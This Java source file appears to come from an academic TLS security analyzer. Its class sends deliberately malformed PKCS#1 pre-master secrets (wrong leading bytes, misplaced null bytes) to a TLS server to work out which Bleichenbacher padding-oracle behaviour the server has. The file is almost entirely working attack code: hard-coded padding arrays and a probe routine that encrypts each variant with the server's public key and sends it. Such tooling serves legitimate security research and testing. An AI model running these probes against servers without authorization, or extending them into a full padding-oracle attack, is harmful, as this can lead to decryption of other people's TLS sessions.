/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package de.rub.nds.ssl.analyzer.attacker.bleichenbacher.oracles;

import de.rub.nds.ssl.analyzer.attacker.bleichenbacher.OracleException;
import de.rub.nds.ssl.stack.Utility;
import de.rub.nds.ssl.stack.protocols.commons.ECipherSuite;
import de.rub.nds.ssl.stack.protocols.commons.EProtocolVersion;
import de.rub.nds.ssl.stack.protocols.commons.KeyExchangeParams;
import de.rub.nds.ssl.stack.protocols.handshake.ClientHello;
import de.rub.nds.ssl.stack.protocols.handshake.ClientKeyExchange;
import de.rub.nds.ssl.stack.protocols.handshake.datatypes.CipherSuites;
import de.rub.nds.ssl.stack.protocols.handshake.datatypes.EncPreMasterSecret;
import de.rub.nds.ssl.stack.protocols.handshake.datatypes.PreMasterSecret;
import de.rub.nds.ssl.stack.protocols.handshake.datatypes.RandomValue;
import de.rub.nds.ssl.stack.trace.MessageContainer;
import de.rub.nds.ssl.stack.workflows.TLS10HandshakeWorkflow;
import de.rub.nds.ssl.stack.workflows.commons.ESupportedSockets;
import de.rub.nds.ssl.stack.workflows.commons.MessageBuilder;
import de.rub.nds.ssl.stack.workflows.commons.ObservableBridge;
import java.net.SocketException;
import java.security.PublicKey;
import java.security.Security;
import java.security.interfaces.RSAPublicKey;
import java.util.Observable;
import javax.crypto.Cipher;
import org.apache.log4j.Logger;
import org.bouncycastle.jce.provider.BouncyCastleProvider;

/**
 *
 * @author Sebastian Schinzel
 * @author Juraj Somorovsky
 */
public class DetermineOracleType extends ASSLServerOracle {

    private static final String HOST = "127.0.0.1";
    private static final int PORT = 51624;
    /**
     * Log4j logger initialization.
     */
    static Logger logger = Logger.getRootLogger();
    Cipher cipher;
    /**
     * Test Server Thread.
     */
    private String host;
    private int port;
    /**
     * Protocol short name.
     */
    private String protocolShortName = "TLS";
    private static byte[] currentPKCS = null;
    /**
     * Plain PKCS message 1024 bit
     */
    private static byte[] validPKCS1024 = new byte[]{
        (byte) 0x00, (byte) 0x02, (byte) 0xf5, (byte) 0xa7, (byte) 0x9f,
        (byte) 0xcd, (byte) 0xb1, (byte) 0x27, (byte) 0xf9, (byte) 0x39,
        (byte) 0x15, (byte) 0x21, (byte) 0x49, (byte) 0x71, (byte) 0x65,
        (byte) 0x97, (byte) 0x33, (byte) 0x99, (byte) 0x6d, (byte) 0x9b,
        (byte) 0xcd, (byte) 0x6d, (byte) 0x4b, (byte) 0xe3, (byte) 0xf5,
        (byte) 0xfd, (byte) 0xb5, (byte) 0x71, (byte) 0xd5, (byte) 0x69,
        (byte) 0x71, (byte) 0x91, (byte) 0xb9, (byte) 0x39, (byte) 0xc9,
        (byte) 0x6d, (byte) 0xf5, (byte) 0x59, (byte) 0xf1, (byte) 0xb9,
        (byte) 0x97, (byte) 0xb7, (byte) 0x6b, (byte) 0xff, (byte) 0x33,
        (byte) 0xd1, (byte) 0x9b, (byte) 0x85, (byte) 0x13, (byte) 0xd5,
        (byte) 0x09, (byte) 0xb5, (byte) 0x33, (byte) 0xc9, (byte) 0x2d,
        (byte) 0xcf, (byte) 0xff, (byte) 0x53, (byte) 0xd7, (byte) 0xed,
        (byte) 0xd5, (byte) 0x1d, (byte) 0x45, (byte) 0x4d, (byte) 0xc9,
        (byte) 0xcb, (byte) 0x4b, (byte) 0x27, (byte) 0x21, (byte) 0x5f,
        (byte) 0x69, (byte) 0xf5, (byte) 0x67, (byte) 0x5d, (byte) 0xab,
        (byte) 0x9b, (byte) 0xf5,
        (byte) 0x39, (byte) 0x1b,
        (byte) 0x00, // <-- NULL byte at pos 77 (+130)
        (byte) 0x03, (byte) 0x01,
        (byte) 0x06, (byte) 0x26, (byte) 0xa6, (byte) 0x40, (byte) 0x57,
        (byte) 0x4b, (byte) 0x50, (byte) 0xd6, (byte) 0xa3, (byte) 0xd0,
        (byte) 0x8a, (byte) 0x70, (byte) 0x16, (byte) 0x0a, (byte) 0x0d,
        (byte) 0xaf, (byte) 0x33, (byte) 0x2a, (byte) 0x7f, (byte) 0x9b,
        (byte) 0xc8, (byte) 0x65, (byte) 0xa7, (byte) 0xb5, (byte) 0x54,
        (byte) 0xe7, (byte) 0x48, (byte) 0x9f, (byte) 0x57, (byte) 0xda,
        (byte) 0xc9, (byte) 0xbf, (byte) 0x34, (byte) 0x8b, (byte) 0x8d,
        (byte) 0xd4, (byte) 0x84, (byte) 0xed, (byte) 0xc9, (byte) 0x63,
        (byte) 0x2b, (byte) 0x16, (byte) 0x6f, (byte) 0x2c, (byte) 0x38,
        (byte) 0x40};
    /**
     * Plain PKCS message, 2048 bit
     */
    private static byte[] validPKCS2048 = new byte[]{
        (byte) 0x00, (byte) 0x02, (byte) 0xf5, (byte) 0xa7, (byte) 0x9f,
        (byte) 0xcd, (byte) 0xb1, (byte) 0x27, (byte) 0xf9, (byte) 0x39,
        (byte) 0x15, (byte) 0x21, (byte) 0x49, (byte) 0x71, (byte) 0x65,
        (byte) 0x97, (byte) 0x33, (byte) 0x99, (byte) 0x6d, (byte) 0x9b,
        (byte) 0xcd, (byte) 0x6d, (byte) 0x4b, (byte) 0xe3, (byte) 0xf5,
        (byte) 0xfd, (byte) 0xb5, (byte) 0x71, (byte) 0xd5, (byte) 0x69,
        (byte) 0x71, (byte) 0x91, (byte) 0xb9, (byte) 0x39, (byte) 0xc9,
        (byte) 0x6d, (byte) 0xf5, (byte) 0x59, (byte) 0xf1, (byte) 0xb9,
        (byte) 0x97, (byte) 0xb7, (byte) 0x6b, (byte) 0xff, (byte) 0x33,
        (byte) 0xd1, (byte) 0x9b, (byte) 0x85, (byte) 0x13, (byte) 0xd5,
        (byte) 0x09, (byte) 0xb5, (byte) 0x33, (byte) 0xc9, (byte) 0x2d,
        (byte) 0xcf, (byte) 0xff, (byte) 0x53, (byte) 0xd7, (byte) 0xed,
        (byte) 0xd5, (byte) 0x1d, (byte) 0x45, (byte) 0x4d, (byte) 0xc9,
        (byte) 0xcb, (byte) 0x4b, (byte) 0x27, (byte) 0x21, (byte) 0x5f,
        (byte) 0x69, (byte) 0xf5, (byte) 0x67, (byte) 0x5d, (byte) 0xab,
        (byte) 0x9b, (byte) 0xf5,
                (byte) 0xc3, (byte) 0xc3, (byte) 0xaf,
                (byte) 0x7f, (byte) 0x6d, (byte) 0xa1, (byte) 0xe5, (byte) 0xfd,
                (byte) 0x3d, (byte) 0x93, (byte) 0xbb, (byte) 0x29, (byte) 0x11,
                (byte) 0x9b, (byte) 0x59, (byte) 0x5f, (byte) 0x11, (byte) 0x17,
                (byte) 0x17, (byte) 0xaf, (byte) 0x71, (byte) 0x33, (byte) 0xd7,
                (byte) 0x3f, (byte) 0x1b, (byte) 0x2f, (byte) 0x2b, (byte) 0xcd,
                (byte) 0x77, (byte) 0xfd, (byte) 0x3f, (byte) 0x5d, (byte) 0x67,
                (byte) 0x3b, (byte) 0x8f, (byte) 0xcd, (byte) 0xc5, (byte) 0x07,
                (byte) 0x6f, (byte) 0x59, (byte) 0x2b, (byte) 0xa7, (byte) 0x0d,
                (byte) 0xd3, (byte) 0x93, (byte) 0x87, (byte) 0x8d, (byte) 0x25,
                (byte) 0x47, (byte) 0x3b, (byte) 0xf7, (byte) 0x2d, (byte) 0xf9,
                (byte) 0x69, (byte) 0xdd, (byte) 0xe5, (byte) 0x85, (byte) 0x79,
                (byte) 0x7d, (byte) 0xc9, (byte) 0x09, (byte) 0xb7, (byte) 0xb7,
                (byte) 0x3d, (byte) 0x07, (byte) 0x23, (byte) 0x25, (byte) 0x07,
                (byte) 0x71, (byte) 0xb9, (byte) 0x1b, (byte) 0xcf, (byte) 0x15,
                (byte) 0x99, (byte) 0xdf, (byte) 0xb5, (byte) 0x6b, (byte) 0x29,
                (byte) 0x21, (byte) 0x4d, (byte) 0x4b, (byte) 0xf5, (byte) 0x31,
                (byte) 0x37, (byte) 0x9b, (byte) 0x43, (byte) 0x89, (byte) 0xd9,
                (byte) 0xef, (byte) 0x81, (byte) 0x55, (byte) 0x61, (byte) 0x4f,
                (byte) 0xc9, (byte) 0xff, (byte) 0xcf, (byte) 0x49, (byte) 0x73,
                (byte) 0xa9, (byte) 0x7f, (byte) 0xcb, (byte) 0xb5, (byte) 0x4f,
                (byte) 0x9d, (byte) 0xa5, (byte) 0xc9, (byte) 0x97, (byte) 0x3d,
                (byte) 0x9b, (byte) 0xf1, (byte) 0x9f, (byte) 0xf1, (byte) 0x95,
                (byte) 0xf9, (byte) 0x07, (byte) 0xa7, (byte) 0x95, (byte) 0xd5,
                (byte) 0xef, (byte) 0xd3, (byte) 0x4b, (byte) 0x27, (byte) 0x1f,
                (byte) 0x1f, (byte) 0x27, (byte) 0x9f, (byte) 0x5d, (byte) 0x8f,
        (byte) 0x39, (byte) 0x1b,
        (byte) 0x00, // <-- NULL byte at pos 77 (+130)
        (byte) 0x03, (byte) 0x01,
        (byte) 0x06, (byte) 0x26, (byte) 0xa6, (byte) 0x40, (byte) 0x57,
        (byte) 0x4b, (byte) 0x50, (byte) 0xd6, (byte) 0xa3, (byte) 0xd0,
        (byte) 0x8a, (byte) 0x70, (byte) 0x16, (byte) 0x0a, (byte) 0x0d,
        (byte) 0xaf, (byte) 0x33, (byte) 0x2a, (byte) 0x7f, (byte) 0x9b,
        (byte) 0xc8, (byte) 0x65, (byte) 0xa7, (byte) 0xb5, (byte) 0x54,
        (byte) 0xe7, (byte) 0x48, (byte) 0x9f, (byte) 0x57, (byte) 0xda,
        (byte) 0xc9, (byte) 0xbf, (byte) 0x34, (byte) 0x8b, (byte) 0x8d,
        (byte) 0xd4, (byte) 0x84, (byte) 0xed, (byte) 0xc9, (byte) 0x63,
        (byte) 0x2b, (byte) 0x16, (byte) 0x6f, (byte) 0x2c, (byte) 0x38,
        (byte) 0x40};
    // 128 (256) bytes total
    private byte[] validPKCS;
    private int posOfTerminatingNullByte;

    public DetermineOracleType(String serverAddress, int serverPort) throws SocketException {
        super(serverAddress, serverPort);
        Security.addProvider(new BouncyCastleProvider());
        host = serverAddress;
        port = serverPort;
    }

    public byte[] getPMS_WrongFirstByte() {
        byte[] plainPKCS_wrong = new byte[validPKCS.length];
        System.arraycopy(validPKCS, 0, plainPKCS_wrong, 0, validPKCS.length);
        plainPKCS_wrong[0] = 23;
         System.out.println("------------------> " + Utility.bytesToHex(plainPKCS_wrong));
        return plainPKCS_wrong;
    }

    public byte[] getPMS_WrongSecondByte() {
        byte[] plainPKCS_wrong = new byte[validPKCS.length];
        System.arraycopy(validPKCS, 0, plainPKCS_wrong, 0, validPKCS.length);
        plainPKCS_wrong[1] = 23;
        return plainPKCS_wrong;
    }

    public byte[] getPMS_NoNullByte() {
        byte[] plainPKCS_wrong = new byte[validPKCS.length];
        System.arraycopy(validPKCS, 0, plainPKCS_wrong, 0, validPKCS.length);
        plainPKCS_wrong[posOfTerminatingNullByte] = 0x3;
        System.out.println("------------------> " + Utility.bytesToHex(plainPKCS_wrong));
        return plainPKCS_wrong;
    }

    public byte[] getPMS_NullByteInPadding() {
        byte[] plainPKCS_wrong = new byte[validPKCS.length];
        System.arraycopy(validPKCS, 0, plainPKCS_wrong, 0, validPKCS.length);
        plainPKCS_wrong[posOfTerminatingNullByte - 10] = 0x0;
        return plainPKCS_wrong;
    }

    public byte[] getPMS_NullByteInPMS() {
        byte[] plainPKCS_wrong = new byte[validPKCS.length];
        System.arraycopy(validPKCS, 0, plainPKCS_wrong, 0, validPKCS.length);
        plainPKCS_wrong[plainPKCS_wrong.length - 2] = 0x0;
        return plainPKCS_wrong;
    }

    public byte[] getPMS_NullByteAtPos2() {
        byte[] plainPKCS_wrong = new byte[validPKCS.length];
        System.arraycopy(validPKCS, 0, plainPKCS_wrong, 0, validPKCS.length);
        plainPKCS_wrong[2] = 0x0;
        return plainPKCS_wrong;
    }

    public byte[] getPMS_NullByteAtPos9() {
        byte[] plainPKCS_wrong = new byte[validPKCS.length];
        System.arraycopy(validPKCS, 0, plainPKCS_wrong, 0, validPKCS.length);
        plainPKCS_wrong[9] = 0x0;
        return plainPKCS_wrong;
    }

    @Override
    public boolean checkPKCSConformity(byte[] msg) throws OracleException {
        return false;
    }

    /**
     * Update observed object.
     *
     * @param o Observed object
     * @param arg Arguments
     */
    @Override
    public final void update(final Observable o, final Object arg) {
        TLS10HandshakeWorkflow.EStates states = null;
        MessageContainer trace = null;
        ObservableBridge obs;
        if (o instanceof ObservableBridge) {
            obs = (ObservableBridge) o;
            states = (TLS10HandshakeWorkflow.EStates) obs.getState();
            trace = (MessageContainer) arg;
        }
        if (states != null) {
            switch (states) {
                case CLIENT_HELLO:
                    MessageBuilder builder = new MessageBuilder();
                    CipherSuites suites = new CipherSuites();
                    RandomValue random = new RandomValue();
                    suites.setSuites(new ECipherSuite[]{
                                ECipherSuite.TLS_RSA_WITH_AES_128_CBC_SHA});
                    ClientHello clientHello = builder.createClientHello(
                            EProtocolVersion.TLS_1_0);

                    trace.setCurrentRecord(clientHello);
                    break;
                case CLIENT_KEY_EXCHANGE:
                    KeyExchangeParams keyParams =
                            KeyExchangeParams.getInstance();
                    PublicKey pk = keyParams.getPublicKey();
                    ClientKeyExchange cke = new ClientKeyExchange(
                            PROTOCOL_VERSION,
                            keyParams.getKeyExchangeAlgorithm());
                    byte[] pmsBytes = new byte[48];
                    System.arraycopy(currentPKCS, currentPKCS.length - 48,
                            pmsBytes, 0, pmsBytes.length);

                    PreMasterSecret pms = new PreMasterSecret(pmsBytes);
                    getWorkflow().setPreMasterSecret(pms);

                    //encrypt the PreMasterSecret
                    EncPreMasterSecret encPMS = new EncPreMasterSecret(pk);
                    encPMS.setEncryptedPreMasterSecret(getEncPMS());
                    cke.setExchangeKeys(encPMS);

                    trace.setCurrentRecord(cke);
                    break;
                default:
                    break;
            }
        }
    }

    private void go() {

        try {
            ESupportedSockets socket = ESupportedSockets.StandardSocket;
            PublicKey pubKey = fetchServerPublicKey(host, port);
            int bitLength = ((RSAPublicKey) pubKey).getModulus().bitLength();
            System.out.println("===> Key Size: " + bitLength);
            cipher = Cipher.getInstance("RSA/None/NoPadding");
            cipher.init(Cipher.ENCRYPT_MODE, pubKey);
            
            if(bitLength >1024) {
                validPKCS = validPKCS2048.clone();
            } else {
                validPKCS = validPKCS1024.clone();
            }
            posOfTerminatingNullByte = validPKCS.length - 49;

            System.out.println("#################### Sending a PERFECT PMS");
            currentPKCS = validPKCS;
            byte[] result = cipher.doFinal(currentPKCS);
            executeWorkflow(result, socket);

            System.out.println("#################### Sending a PMS with wrong FIRST byte");
            currentPKCS = getPMS_WrongFirstByte();
            result = cipher.doFinal(currentPKCS);
            executeWorkflow(result, socket);

            System.out.println("#################### Sending a PMS with wrong SECOND byte");
            currentPKCS = getPMS_WrongSecondByte();
            result = cipher.doFinal(currentPKCS);
            executeWorkflow(result, socket);

            System.out.println("#################### Sending a PMS with NULL byte in Padding");
            currentPKCS = getPMS_NullByteInPadding();
            result = cipher.doFinal(currentPKCS);
            executeWorkflow(result, socket);

            System.out.println("#################### Sending a PMS with no NULL byte before PMS");
            currentPKCS = getPMS_NoNullByte();
            result = cipher.doFinal(currentPKCS);
            executeWorkflow(result, socket);

            System.out.println("#################### Sending a PMS with a NULL byte at position 3");
            currentPKCS = getPMS_NullByteAtPos2();
            result = cipher.doFinal(currentPKCS);
            executeWorkflow(result, socket);

            System.out.println("#################### Sending a PMS with a NULL byte at position 9");
            currentPKCS = getPMS_NullByteAtPos9();
            result = cipher.doFinal(currentPKCS);
            executeWorkflow(result, socket);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) throws SocketException {
        System.out.println("staring....");
        DetermineOracleType dot = new DetermineOracleType(HOST, PORT);
        dot.go();
    }
}
